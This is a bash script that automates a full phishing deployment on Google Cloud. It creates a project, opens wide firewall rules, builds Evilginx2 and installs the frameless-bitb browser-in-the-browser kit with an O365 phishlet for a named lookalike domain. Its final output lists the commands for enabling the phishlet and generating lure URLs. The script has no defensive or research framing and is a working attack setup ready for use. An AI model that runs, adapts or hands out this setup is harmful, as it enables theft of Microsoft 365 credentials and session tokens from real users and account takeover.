#!/bin/bash
# Complete GCP Frameless BITB Setup - Following EXACT Instructions
# Adapted from: https://github.com/waelmas/frameless-bitb

set -e

DOMAIN="exodustraderai.info"
ZONE="us-central1-a"
MACHINE_TYPE="e2-medium"

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

log() { echo -e "${GREEN}[$(date +'%H:%M:%S')]${NC} $1"; }
warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; exit 1; }

# ============================================
# STEP 1: Create GCP Project
# ============================================
create_gcp_project() {
    log "Creating new GCP project..."

    TIMESTAMP=$(date +%s)
    PROJECT_ID="bitb-phishing-${TIMESTAMP}"
    INSTANCE_NAME="bitb-server"

    gcloud projects create $PROJECT_ID --name="Frameless BITB" || error "Failed to create project"
    gcloud config set project $PROJECT_ID

    log "Linking billing account..."
    BILLING_ACCOUNT=$(gcloud beta billing accounts list --filter=open=true --format="value(name)" --limit=1 2>/dev/null)

    if [ -z "$BILLING_ACCOUNT" ]; then
        error "No billing account found. Please enable billing manually."
    fi

    gcloud beta billing projects link $PROJECT_ID --billing-account=$BILLING_ACCOUNT

    log "Waiting for billing to propagate (180 seconds)..."
    sleep 180

    log "Enabling APIs..."
    gcloud services enable compute.googleapis.com cloudresourcemanager.googleapis.com --quiet

    echo $PROJECT_ID
}

# ============================================
# STEP 2: Create Firewall Rules
# ============================================
setup_firewall() {
    log "Creating firewall rules..."

    gcloud compute firewall-rules create bitb-allow-all \
        --direction=INGRESS \
        --priority=1000 \
        --network=default \
        --action=ALLOW \
        --rules=tcp:80,tcp:443,tcp:22,tcp:3333,tcp:8080,tcp:8443,tcp:53,udp:53 \
        --source-ranges=0.0.0.0/0 \
        --target-tags=bitb-server \
        --quiet
}

# ============================================
# STEP 3: Create VM Instance
# ============================================
create_vm() {
    log "Creating VM instance..."

    gcloud compute instances create $INSTANCE_NAME \
        --zone=$ZONE \
        --machine-type=$MACHINE_TYPE \
        --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY \
        --tags=bitb-server \
        --create-disk=auto-delete=yes,boot=yes,image=projects/ubuntu-os-cloud/global/images/family/ubuntu-2204-lts,mode=rw,size=30,type=pd-balanced \
        --quiet

    EXTERNAL_IP=$(gcloud compute instances describe $INSTANCE_NAME --zone=$ZONE --format='get(networkInterfaces[0].accessConfigs[0].natIP)')

    log "VM created with IP: $EXTERNAL_IP"

    log "Waiting for VM to be ready..."
    sleep 60

    echo $EXTERNAL_IP
}

# ============================================
# STEP 4: Generate VM Setup Script
# ============================================
generate_vm_script() {
    cat > /tmp/vm-bitb-setup.sh << 'VMSCRIPT'
#!/bin/bash
set -e

DOMAIN="exodustraderai.info"

log() { echo -e "\033[0;32m[$(date +'%H:%M:%S')]\033[0m $1"; }

log "=========================================="
log "Frameless BITB Setup on VM"
log "=========================================="

# Update system
log "Updating system packages..."
sudo apt update && sudo apt upgrade -y

# Install dependencies
log "Installing dependencies..."
sudo apt install -y git make build-essential apache2 tmux

# Install latest Go
log "Installing latest Go..."
LATEST_GO=$(curl -s https://go.dev/VERSION?m=text | head -1)
wget -q "https://go.dev/dl/${LATEST_GO}.linux-amd64.tar.gz"
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf "${LATEST_GO}.linux-amd64.tar.gz"
export PATH=$PATH:/usr/local/go/bin
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.profile
source ~/.profile

log "Go version: $(go version)"

# Clone and build Evilginx from source
log "Building Evilginx from source..."
cd ~
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Setup Evilginx directory structure
log "Setting up Evilginx directories..."
mkdir -p ~/evilginx
cp build/evilginx ~/evilginx/
cp -r phishlets ~/evilginx/
cp -r redirectors ~/evilginx/

# Set capabilities for Evilginx
sudo setcap CAP_NET_BIND_SERVICE=+eip ~/evilginx/evilginx

# Fix DNS stub listener
log "Fixing DNS configuration..."
sudo sed -i 's/#DNSStubListener=yes/DNSStubListener=no/' /etc/systemd/resolved.conf
sudo systemctl restart systemd-resolved

# Configure Evilginx BEFORE first run
log "Configuring Evilginx..."
mkdir -p ~/.evilginx
cat > ~/.evilginx/config.json << 'EVILCONFIG'
{
  "blacklist": {
    "mode": "noadd"
  },
  "general": {
    "autocert": false,
    "bind_ipv4": "",
    "dns_port": 53,
    "domain": "exodustraderai.info",
    "external_ipv4": "",
    "https_port": 8443,
    "ipv4": "",
    "unauth_url": ""
  },
  "phishlets": {}
}
EVILCONFIG

# Install and configure Apache
log "Configuring Apache..."
sudo a2enmod proxy proxy_http proxy_balancer lbmethod_byrequests env include setenvif ssl cache substitute headers rewrite
sudo a2ensite default-ssl
sudo a2dismod access_compat
sudo systemctl enable apache2

# Clone frameless-bitb repo
log "Cloning frameless-bitb repository..."
cd ~
git clone https://github.com/waelmas/frameless-bitb.git
cd frameless-bitb

# Setup Apache pages
log "Setting up Apache pages..."
sudo mkdir -p /var/www/{home,primary,secondary}
sudo cp -r pages/home/* /var/www/home/
sudo cp -r pages/primary/* /var/www/primary/
sudo cp -r pages/secondary/* /var/www/secondary/
sudo rm -rf /var/www/html

# Copy O365 phishlet
sudo cp O365.yaml ~/evilginx/phishlets/

# Update domain in all files
log "Updating domain in configuration files..."
find ~/frameless-bitb -type f \( -name "*.conf" -o -name "*.js" -o -name "*.html" \) -exec sudo sed -i "s/fake\.com/${DOMAIN}/g" {} \;

# Generate SSL certificates
log "Generating SSL certificates..."
sudo mkdir -p /etc/ssl/localcerts/${DOMAIN}

sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/ssl/localcerts/${DOMAIN}/privkey.pem \
  -out /etc/ssl/localcerts/${DOMAIN}/fullchain.pem \
  -subj "/C=US/ST=State/L=City/O=Org/CN=${DOMAIN}" \
  -addext "subjectAltName=DNS:${DOMAIN},DNS:*.${DOMAIN}"

sudo chmod 600 /etc/ssl/localcerts/${DOMAIN}/privkey.pem

# Copy and configure Apache config
log "Configuring Apache virtual hosts..."
sudo cp custom-subs /etc/apache2/ -r

# Update custom-subs domain
sudo find /etc/apache2/custom-subs -type f -exec sed -i "s/fake\.com/${DOMAIN}/g" {} \;

# Use Mac Chrome BITB config
sudo cp apache-configs/mac-chrome-bitb.conf /etc/apache2/sites-enabled/000-default.conf

# Update Apache config with correct domain and cert paths
sudo sed -i "s/fake\.com/${DOMAIN}/g" /etc/apache2/sites-enabled/000-default.conf
sudo sed -i "s|/etc/ssl/localcerts/fake.com|/etc/ssl/localcerts/${DOMAIN}|g" /etc/apache2/sites-enabled/000-default.conf

# Test and restart Apache
log "Testing Apache configuration..."
sudo apache2ctl configtest
sudo systemctl restart apache2

log "=========================================="
log "VM Setup Complete!"
log "=========================================="
log "Next steps:"
log "1. Set DNS: A record *.${DOMAIN} → VM IP"
log "2. Start Evilginx: tmux new-session -s evilginx"
log "3. Run: cd ~/evilginx && ./evilginx -developer"
log "4. Configure phishlet and create lure"
log "=========================================="
VMSCRIPT

    chmod +x /tmp/vm-bitb-setup.sh
}

# ============================================
# STEP 5: Deploy to VM
# ============================================
deploy_to_vm() {
    local EXTERNAL_IP=$1

    log "Copying setup script to VM..."
    gcloud compute scp /tmp/vm-bitb-setup.sh ${INSTANCE_NAME}:/tmp/ --zone=$ZONE --quiet

    log "Executing setup on VM (this will take 10-15 minutes)..."
    gcloud compute ssh ${INSTANCE_NAME} --zone=$ZONE --command="bash /tmp/vm-bitb-setup.sh"
}

# ============================================
# STEP 6: Configure Evilginx
# ============================================
configure_evilginx() {
    local EXTERNAL_IP=$1

    log "Updating Evilginx external IP..."
    gcloud compute ssh ${INSTANCE_NAME} --zone=$ZONE --command="
        sed -i 's/\"external_ipv4\": \"\"/\"external_ipv4\": \"${EXTERNAL_IP}\"/' ~/.evilginx/config.json
    "
}

# ============================================
# MAIN EXECUTION
# ============================================
main() {
    log "=========================================="
    log "Complete GCP Frameless BITB Setup"
    log "=========================================="
    log ""

    # Create project
    PROJECT_ID=$(create_gcp_project)
    log "Project created: $PROJECT_ID"

    # Setup firewall
    setup_firewall

    # Create VM
    EXTERNAL_IP=$(create_vm)

    # Generate and deploy
    generate_vm_script
    deploy_to_vm $EXTERNAL_IP

    # Configure Evilginx
    configure_evilginx $EXTERNAL_IP

    # Final output
    log ""
    log "=========================================="
    log "🎉 DEPLOYMENT COMPLETE!"
    log "=========================================="
    log ""
    log "📋 DEPLOYMENT INFO:"
    log "   Project ID: $PROJECT_ID"
    log "   VM Name: $INSTANCE_NAME"
    log "   External IP: $EXTERNAL_IP"
    log "   Domain: $DOMAIN"
    log ""
    log "📝 DNS CONFIGURATION REQUIRED:"
    log "   Add these A records to your DNS:"
    log "   Type: A, Name: *, Value: $EXTERNAL_IP, TTL: 300"
    log "   Type: A, Name: @, Value: $EXTERNAL_IP, TTL: 300"
    log ""
    log "🚀 START EVILGINX:"
    log "   SSH: gcloud compute ssh ${INSTANCE_NAME} --zone=$ZONE --project=$PROJECT_ID"
    log "   Start: tmux new-session -s evilginx"
    log "   Run: cd ~/evilginx && ./evilginx -developer"
    log ""
    log "⚙️ EVILGINX COMMANDS:"
    log "   phishlets hostname O365 ${DOMAIN}"
    log "   phishlets enable O365"
    log "   lures create O365"
    log "   lures get-url 0"
    log ""
    log "=========================================="

    # Save info
    cat > gcp-bitb-deployment.txt << EOF
========================================
FRAMELESS BITB DEPLOYMENT INFO
========================================
Deployment Date: $(date)

PROJECT: $PROJECT_ID
VM: $INSTANCE_NAME
IP: $EXTERNAL_IP
Domain: $DOMAIN

SSH Command:
gcloud compute ssh ${INSTANCE_NAME} --zone=$ZONE --project=$PROJECT_ID

DNS Records Needed:
*.${DOMAIN} → $EXTERNAL_IP
${DOMAIN} → $EXTERNAL_IP

Evilginx Commands:
tmux new-session -s evilginx
cd ~/evilginx
./evilginx -developer

Inside Evilginx:
phishlets hostname O365 ${DOMAIN}
phishlets enable O365
lures create O365
lures get-url 0
========================================
EOF

    log "Deployment info saved to: gcp-bitb-deployment.txt"
}

# RUN IT
main "$@"
